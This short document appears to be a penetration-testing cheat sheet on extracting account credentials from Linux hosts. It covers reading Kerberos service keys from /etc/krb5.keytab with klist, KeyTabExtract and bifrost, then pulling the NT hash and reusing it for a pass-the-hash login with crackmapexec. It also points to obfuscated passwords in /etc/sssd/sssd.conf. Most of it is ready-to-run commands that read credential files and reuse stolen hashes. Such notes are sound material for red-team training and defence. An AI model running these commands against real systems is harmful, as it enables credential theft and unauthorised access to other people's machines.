# Extract Accounts locations

## From /etc/krb5.keytab

### The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure.

### Use klist to read the keytab file and parse its content. The key that you see when the key type is 23 is the actual NT Hash of the user.

    klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab (Windows)

### On Linux you can use KeyTabExtract : we want RC4 HMAC hash to reuse the NTLM hash.

    python3 keytabextract.py krb5.keytab

### On macOS you can use bifrost

    ./bifrost -action dump -source keytab -path test

### Connect to the machine using the account and the hash with CME

    crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0"

## From 

    /etc/sssd/sssd.conf

### sss_obfuscate converts a given password into human-unreadable format and places it into appropriate domain section of the SSSD config file, usually located at /etc/sssd/sssd.conf
